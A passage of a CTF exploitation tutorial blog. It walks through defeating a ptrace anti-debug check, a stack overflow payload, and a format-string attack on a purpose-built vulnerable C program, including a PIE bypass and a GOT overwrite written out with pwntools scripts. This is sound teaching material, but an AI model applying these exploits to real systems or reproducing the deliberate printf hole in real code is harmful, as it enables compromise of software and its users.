+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/ChickenStar2.gif" alt=""></p>
+<h3 id="solution-1">Solution<a href="#solution-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>In order to solve the challenge, we need to modify the volatile variable <code>password</code> to <code>0xdeadbeef</code>. However, there is one impediment preventing us from determining the padding length or debugging the program as a result of an anti-debugging technique implemented in <code>check</code>.</p>
+<p>The implementation invokes <code>ptrace</code> function to attach to our process at runtime so it can monitor and control the execution flow. You can find more information about <code>ptrace</code> by visiting this <a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">man page</a>.</p>
+<h4 id="signature-overridden">Signature overridden<a href="#signature-overridden" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>So we have to think of a way to bypass this anti-debugging procedure, and fortunately, we can actually achieve this by abusing the <code>LD_PRELOAD</code> environment variable as it lets us control the loading path of a shared library, hence enables us to neutralize <code>ptrace</code>.</p>
+<p>Let us create a shared library with <code>ptrace</code> signature to override it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// A &#34;do-nothing&#34; ptrace
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">ptrace</span>(<span style="color:#66d9ef">int</span> request, <span style="color:#66d9ef">int</span> pid, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>addr, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data) {
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>then we shall compile it as <code>gcc -shared ptrace.c -o ptrace.so</code> and load it into radare2 with the following options:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ r2 -Ad -e bin.cache<span style="color:#f92672">=</span>true -Rsetenv<span style="color:#f92672">=</span>LD_PRELOAD<span style="color:#f92672">=</span>./ptrace_bypass.so ./ChickenStar
+</code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/ChickenStar3.gif" alt=""></p>
+<h4 id="patching-opcodes">Patching opcodes<a href="#patching-opcodes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Another quick, reliable method is to patch the jump condition inside the <code>check</code> procedure.</p>
+<p>Reload the binary in radare2 with write mode enabled and pay your attention to the code within<code>0x00001293</code> - <code>0x000012ab</code> range.</p>
+<pre tabindex="0"><code>┌ 69: sym.check ();
+...
+│           0x0000128f      4883f8ff       cmp rax, 0xffffffffffffffff
+│       ┌─&lt; 0x00001293      7416           jne 0x12ab			; PATCH
+│       │   0x00001295      488d3d6c0d00.  lea rdi, str.__LOL________  ; 0x2008 ; &quot;========&gt; LOL!!!!!! &lt;========&quot; ; const char *s
+│       │   0x0000129c      e84ffeffff     call sym.imp.puts           ; int puts(const char *s)
+│       │   0x000012a1      bfffffffff     mov edi, 0xffffffff         ; -1 ; int status
+│       │   0x000012a6      e835feffff     call sym.imp._exit          ; void _exit(int status) &lt;--- This will exit the program and we don't want that!
+│       │   ; CODE XREF from sym.check @ 0x1293
+│       └─&gt; 0x000012ab      90             nop
+...
+</code></pre><p>As can be seen, we have to patch the <code>JNE</code> instruction with <code>JE</code> as we want it to always take the jump to the <code>NOP</code> instruction at <code>0x000012ab</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-23_11-42.png" alt=""></p>
+<p>Reopen the file and it should work properly.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/ChickenStar4.gif" alt=""></p>
+<h4 id="debugging">Debugging<a href="#debugging" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>We are finally able to debug as well as calculate the distance between our buffer and <code>password</code>. Now, let us set a breakpoint after <code>scanf</code> and have a look at the stack.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-23_14-11.png" alt=""></p>
+<p>By respectively subtracting the two offsets containing <code>0x43563139</code> and <code>0x636261</code> with each other and we thereby have our padding length of 80 bytes whereas the last 8 bytes is for <code>password</code> (<code>QWORD</code>, or <code>long</code> type).</p>
+<p>Skeleton payload:</p>
+<pre tabindex="0"><code>payload = PADDING (72) + PASSWORD (0xdeadbeef)
+</code></pre><h3 id="solvepy-1">Solve.py<a href="#solvepy-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>This challenge can be solve with this simple one-liner</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python -c <span style="color:#e6db74">&#34;print b&#39;A&#39;*72 + b&#39;\xef\xbe\xad\xde&#39;&#34;</span> | ./ChickenStar 
+</code></pre></div><p>or you want to play around with pwntools more then here:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ChickenStar&#39;</span>)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)
+r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;account statement: &#39;</span>, payload)
+print(r<span style="color:#f92672">.</span>clean()) 
+</code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-23_17-00.png" alt=""></p>
+<h2 id="login-custom">login (custom)<a href="#login-custom" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><strong>Goal:</strong> Be able to fully comprehend the format string vulnerability as well as other protection bits (e.g., PIE/PIC, canary, ASLR and RELRO).</p>
+<p>In the previous tasks, we have been repeatedly mentioning PIE/PIC, format string vulnerability and canaries but did not go in detail. Considering that, I have made a customized challenge as a nice little <em>stopover</em> for you readers to practice and have a concrete understanding about the aforementioned concepts.</p>
+<p>The challenge also comes with its source code and build options, feel free to reproduce or modify it to your liking and it is strongly recommended that you should try to complete the tasks to some extent before reaching the solution part.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">//Build: $ gcc -g readme.c -o readme -pie -fstack-protector -z execstack 
+</span><span style="color:#75715e">// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">long</span> authen_code <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">login</span>();
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>();
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() 
+{
+	login();
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>()
+{
+	printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">Congratulation! You&#39;ve won!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">login</span>()
+{
+	<span style="color:#66d9ef">char</span> creds[<span style="color:#ae81ff">255</span>] <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;\0&#39;</span> };
+	authen_code <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xBADF00D</span>;
+	printf(<span style="color:#e6db74">&#34;Welcome to %lx sector!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, login);
+	printf(<span style="color:#e6db74">&#34;Enter credentials: &#34;</span>);
+	fgets(creds, <span style="color:#66d9ef">sizeof</span>(creds) <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>), stdin);
+	printf(<span style="color:#e6db74">&#34;Verifying...&#34;</span>);
+	printf(creds);
+	<span style="color:#66d9ef">if</span>(<span style="color:#ae81ff">0x1ee71ee7</span> <span style="color:#f92672">==</span> authen_code)
+	{
+		printf(<span style="color:#e6db74">&#34;Nice job!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		printf(<span style="color:#e6db74">&#34;Now gotta call win()!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		exit(<span style="color:#ae81ff">0</span>);
+	}
+	<span style="color:#66d9ef">else</span>
+	{
+		printf(<span style="color:#e6db74">&#34;Your authen_code is invalid!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">authen_code = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, authen_code);
+	}
+}
+</code></pre></div><h3 id="fingerprinting-2">Fingerprinting<a href="#fingerprinting-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Expected output during normal run</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/login1.gif" alt=""></p>
+<p>and the properties.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>0x00001090<span style="color:#f92672">]</span>&gt; iI~nx,relro,canary,bits,pic
+bits     <span style="color:#ae81ff">64</span>
+canary   true
+nx       true
+pic      true
+relro    partial
+</code></pre></div><p>As demonstrated, the program reads from STDIN, prints a welcome message with our input and carries out a conditional jump before exiting. In most scenarios, this conventional functionality of printing out exact input values is likely an indication of information leakage, herein the format string vulnerability.</p>
+<p>You can try confirming it by feeding the buffer with <strong>format specifiers</strong> then see if there are any odd values printed out. Let us use <code>%p</code> which is a pointer specifier and here is the result:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_09-12.png" alt=""></p>
+<p>You can go back to and read the previous example about format string in part one - <a href="https://legiahuyy.github.io/blog/en/posts/pwns-1/#solution-3">canary</a>.</p>
+<h3 id="code-breakdown-2">Code breakdown<a href="#code-breakdown-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>There are three functions: <code>main</code>, <code>login</code> and <code>win</code>; and a global variable <code>authen_code</code>.</p>
+<p>Whereas <code>main</code> and <code>win</code> respectively invokes <code>login</code> and prints a congratulation message, <code>login</code> has a slightly more complicated structure as it does:</p>
+<ul>
+<li>Create a buffer, dubbed <code>creds</code>, of 255 bytes in size</li>
+<li>Assign <code>0xBADF00D</code> to the global variable <code>authen_code</code></li>
+<li>Print the current address of itself</li>
+<li>Securely read the input from STDIN to <code>creds</code> using <code>fgets</code> then print <code>creds</code> out again with <code>printf</code></li>
+<li>Invoke <code>exit(0)</code> whether <code>0x1ee71ee7 == authen_code</code>, otherwise print an error message and current <code>authen_code</code> value</li>
+</ul>
+<p>Henceforth, we will have to:</p>
+<ul>
+<li>
+<p>Calculate the base address of our binary using the leaked address of <code>login</code> and bypass PIE/PIC</p>
+</li>
+<li>
+<p>Manipulate the format string vulnerability to perform an arbitrary read/write and modify the value of <code>authen_code</code> to <code>0x1ee71ee7</code></p>
+</li>
+<li>
+<p>Overwrite the <strong>G</strong>lobal <strong>O</strong>ffset <strong>T</strong>able and call <code>win</code></p>
+</li>
+</ul>
+<h3 id="in-depth-analysis-1">In-depth analysis<a href="#in-depth-analysis-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Load the binary into radare2 and have a glance at its disassembled functions.</p>
+<p><code>main</code>:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_10-11.png" alt=""></p>
+<p>and <code>win</code>:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_10-16.png" alt=""></p>
+<p>You might be wondering why there is no canary check in either the prologue or epilogue of these two <code>main</code> and <code>win</code> functions. This happens since the two simply do not inquire about the stack or have any particularly tasks that need the sentinel values.</p>
+<p><code>login</code>, however, is different as it is plain to see the canary is being stored at <code>rbp-0x8</code>:</p>
+<pre tabindex="0"><code>[0x7f492b935050]&gt; pdf @ sym.login
+            ; CALL XREF from main @ 0x56279e188182
+            ; DATA XREF from sym.login @ 0x56279e18820c
+┌ 329: sym.login ();
+│           ; var int64_t var_110h @ rbp-0x110
+│           ; var int64_t var_108h @ rbp-0x108
+│           ; var int64_t var_100h @ rbp-0x100
+│           ; var int64_t var_8h @ rbp-0x8
+│           0x56279e1881a4      55             push rbp
+│           0x56279e1881a5      4889e5         mov rbp, rsp
+│           0x56279e1881a8      4881ec100100.  sub rsp, 0x110
+│           0x56279e1881af      64488b042528.  mov rax, qword fs:[0x28]
+│           0x56279e1881b8      488945f8       mov qword [var_8h], rax
+│           0x56279e1881bc      31c0           xor eax, eax
+...
+│           0x56279e1882d6      90             nop
+│           0x56279e1882d7      488b45f8       mov rax, qword [var_8h]
+│           0x56279e1882db      64482b042528.  sub rax, qword fs:[0x28]
+│       ┌─&lt; 0x56279e1882e4      7405           je 0x56279e1882eb
+│       │   0x56279e1882e6      e855fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
+│       └─&gt; 0x56279e1882eb      c9             leave
+└           0x56279e1882ec      c3             ret
+</code></pre><h4 id="arbitrary-read-with-format-string">Arbitrary read with Format String<a href="#arbitrary-read-with-format-string" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Our first objective is to have <code>authen_code</code> value overwritten to <code>0x1ee71ee7</code>.</p>
+<p>But there is no buffer overflow gadget to use as the code is using <code>fgets</code> to properly read our input, so the only solution left is format string which can be triggered within the <code>printf</code> function. We thus have to determine where we can read our buffer, and fortunately that pwntools is able to help us to automatically accomplish the process. It might be worth nothing but you can find information about the manual method in our previous &ldquo;canary&rdquo; challenge from part one.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_11-29.png" alt=""></p>
+<p>I have already prepared the script using FmtStr<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#75715e"># Load the binary</span>
+elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./login&#34;</span>)	
+
+<span style="color:#75715e"># Due to my Linux is constantly handling lots of buffering,</span>
+<span style="color:#75715e"># so it has to use a pseudo-terminal to prompt for IO properly</span>
+pty <span style="color:#f92672">=</span> process<span style="color:#f92672">.</span>PTY	
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_fmt</span>(payload):
+	p <span style="color:#f92672">=</span> process([elf<span style="color:#f92672">.</span>path], stdin<span style="color:#f92672">=</span>pty, stdout<span style="color:#f92672">=</span>pty)
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter credentials: &#39;</span>, payload)
+	<span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Verifying...&#39;</span>)<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#75715e"># Automatically looking for our buffer offset</span>
+autofmt <span style="color:#f92672">=</span> FmtStr(exec_fmt) 
+<span style="color:#75715e"># return offset position</span>
+offset <span style="color:#f92672">=</span> autofmt<span style="color:#f92672">.</span>offset	
+</code></pre></div><p>and it works properly.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_11-35.png" alt=""></p>
+<p>Now that our buffer starts at the sixth offset and we want it to overwrite <code>authen_code</code> which is a global variable, so we <em>presumably</em> can get its address using <code>readelf</code> as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/Study/PWN/etc/frmstr<span style="color:#f92672">]</span>
+└─$ readelf -s ./login|grep authen_code
+    31: <span style="color:#ae81ff">0000000000004060</span>     <span style="color:#ae81ff">8</span> OBJECT  GLOBAL DEFAULT   <span style="color:#ae81ff">25</span> authen_code
+</code></pre></div><p>You perhaps are thinking that <code>0x00004060</code> is the correct address for <code>authen_code</code> then you must have forgotten about the PIE bit, but it is completely fine since we are going to glide over it one more time.</p>
+<blockquote>
+<p>In <a href="https://en.wikipedia.org/wiki/Computing">computing</a>, <strong>position-independent code</strong>[<a href="https://en.wikipedia.org/wiki/Position-independent_code#cite_note-Intel_iRMX-1">1]</a> (<strong>PIC</strong>[<a href="https://en.wikipedia.org/wiki/Position-independent_code#cite_note-Intel_iRMX-1">1]</a>) or <strong>position-independent executable</strong> (<strong>PIE</strong>)[<a href="https://en.wikipedia.org/wiki/Position-independent_code#cite_note-RedHat-2">2]</a> is a body of <a href="https://en.wikipedia.org/wiki/Machine_code">machine code</a> that, being placed somewhere in the <a href="https://en.wikipedia.org/wiki/Primary_memory">primary memory</a>, executes properly regardless of its <a href="https://en.wikipedia.org/wiki/Absolute_address">absolute address</a>.</p>
+<p><a href="https://en.wikipedia.org/wiki/Position-independent_code">Wikipedia</a></p>
+</blockquote>
+<p>It basically means that every time you run the file, all the addresses of functions, global objects therein will be randomized and you cannot just dump these out statically as they are inconsistent.</p>
+<h4 id="piepic-bypass-with-given-leaks">PIE/PIC bypass with given leaks<a href="#piepic-bypass-with-given-leaks" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>On that account, we need to compute the base address before being able to invoke or even modify anything. Fortunately, <code>login</code> tells us where it is located and we can use the given address to bypass PIE and this is also our second objective.</p>
+<p>Imagine PIE/PIC executables work like this, you have a <code>main</code> function is located at <code>0x00412</code>, when you run the file, <code>main</code>&rsquo;s address is then added up with a random value, say <code>0x1000</code>, so that now it is <code>0x01412</code>. Moreover, this random value, dubbed base address, is shared across the memory region of the current instance; hence, our <em>formula</em> for this</p>
+<pre tabindex="0"><code>base_address = leaked_login_addr - abs_login_addr
+</code></pre><p>and we can automate the process using pwntools.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">...</span>
+
+p <span style="color:#f92672">=</span> process([elf<span style="color:#f92672">.</span>path], stdin<span style="color:#f92672">=</span>pty, stdout<span style="color:#f92672">=</span>pty)
+
+leaked_login_addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Welcome to &#39;</span>)<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; sector!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>), <span style="color:#ae81ff">16</span>)
+abs_login_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;login&#39;</span>]
+elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leaked_login_addr <span style="color:#f92672">-</span> abs_login_addr
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;leaked_login_addr = </span><span style="color:#e6db74">{</span>hex(leaked_login_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;abs_login_addr = </span><span style="color:#e6db74">{</span>hex(abs_login_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;base_address = </span><span style="color:#e6db74">{</span>hex(elf<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#f92672">...</span>
+</code></pre></div><p>On the first and second run.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2022-01-02_14-55.png" alt=""></p>
+<h4 id="arbitrary-write-with-format-string">Arbitrary write with Format String<a href="#arbitrary-write-with-format-string" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>We by far have had the base address, <code>authen_code</code> address and the buffer offset, we now just need to construct our payload, accordingly modify the value of <code>authen_code</code> and complete our first goal. This can be feasible either constructing the payload manually or using auxiliaries from pwntools.</p>
+<p>As for myself, I would prefer the automated method to the conventional way since <del>I am lazy</del> the latter is much more strenuous for me to handle. That being said, it is worth showing you a brief concept how we can do it by hand.</p>
+<p>The<code>printf</code> function has a very special format specifier <code>%n</code> which instead of printing something, it causes <code>printf</code> to load a pointer and write there <strong>the number of characters printed</strong> by <code>printf</code> before the occurrence of <code>%n</code>. For instance, we have a C snippet as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">...
+<span style="color:#66d9ef">int</span> main()
+{
+	<span style="color:#66d9ef">int</span> data <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	printf(<span style="color:#e6db74">&#34;abcdefg%n</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>data);
+	printf(<span style="color:#e6db74">&#34;data = %d&#34;</span>, data);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Build and run the source:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2022-01-02_19-39.png" alt=""></p>
+<p>The idea is that you will print a string of <code>0x1ee71ee7</code> characters to <code>authen_code</code>&rsquo;s address using the <code>%n</code> format specifier in <code>print</code>, so your payload looks like this much or less.</p>
+<pre tabindex="0"><code>payload = authen_code_addr + b'A' * (0x1ee71ee7 - sizeof(authen_code_addr)) + b&quot;%hhn&quot;
+</code></pre><p>We have to substract the <code>0x1ee71ee7</code> for <code>sizeof(authen_code_addr)</code> as <code>%n</code> would count it as well, remember? And <code>%hhn</code> instructs <code>printf</code> to write the number of printed bytes as byte or that of <code>%hn</code> as short for smaller size write.</p>
+<p>But efficiency, performance <del>and laziness</del> are more to your liking, pwntools has a handy utility for it to match exactly what you desire - <code>fmtstr_payload</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Syntax</span>
+fmtstr_payload(offset, writes, numbwritten<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, write_size<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;byte&#39;</span>)
+</code></pre></div><p>The function works similar to how we explain above in the manual method, however, it also provides optimization and thankfully save us some time.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">...</span>
+p <span style="color:#f92672">=</span> process([elf<span style="color:#f92672">.</span>path], stdin<span style="color:#f92672">=</span>pty, stdout<span style="color:#f92672">=</span>pty)
+
+leaked_login_addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Welcome to &#39;</span>)<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; sector!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>), <span style="color:#ae81ff">16</span>)
+abs_login_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;login&#39;</span>]
+elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leaked_login_addr <span style="color:#f92672">-</span> abs_login_addr
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;leaked_login_addr = </span><span style="color:#e6db74">{</span>hex(leaked_login_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;abs_login_addr = </span><span style="color:#e6db74">{</span>hex(abs_login_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;base_address = </span><span style="color:#e6db74">{</span>hex(elf<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+
+authen_code_offset <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;authen_code&#39;</span>]
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;authen_code offset: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> hex(authen_code_offset))
+
+payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">6</span>, {authen_code_offset : <span style="color:#ae81ff">0x1ee71ee7</span>})
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;fmtstr_payload: </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter credentials: &#39;</span>, payload)
+print(p<span style="color:#f92672">.</span>clean()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;latin-1&#39;</span>))
+</code></pre></div><p>And we have achieved our first goal - modify <code>authen_code</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2022-01-02_20-14.png" alt=""></p>
+<h4 id="overwrite-got">Overwrite GOT<a href="#overwrite-got" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Global Offset Table, or GOT, is one of the sections within an ELF binary that maps symbols to their corresponding absolute memory addresses and facilitate PIE/PIC portion. Furthermore, GOT is loaded into the memory at startup to provide dynamic linking as well as functionalities for the program. Simply put, GOT contains the addresses of functions that the program will use to call from <code>libc</code>, the C standard library and if we could overwrite an entry, it would be possible to gain code execution.</p>
+<p>In our case, we want to overwrite GOT entry of <code>exit</code> with the location of <code>win</code>, however, there are some constraints:</p>
+<ol>
+<li>If the binary has <strong>Full RELRO</strong> protection enabled <strong>then no GOT overwrite</strong>.</li>
+<li>You need to bypass PIE/PIC, ASLR before being able to call anything.</li>
+<li>Format string or buffer overflow vulnerability.</li>
+</ol>
+<p>Luckily, the binary has <strong>Partial RELRO</strong> property and we have already handled PIE/PIC in the prior part so we can simply overwrite the <code>exit</code> entry and replace it with <code>win</code> using pwntools.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">6</span>, {authen_code_offset : <span style="color:#ae81ff">0x1ee71ee7</span>, elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;exit&#39;</span>] : elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;win&#39;</span>]})
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;fmtstr_payload: </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter credentials: &#39;</span>, payload)
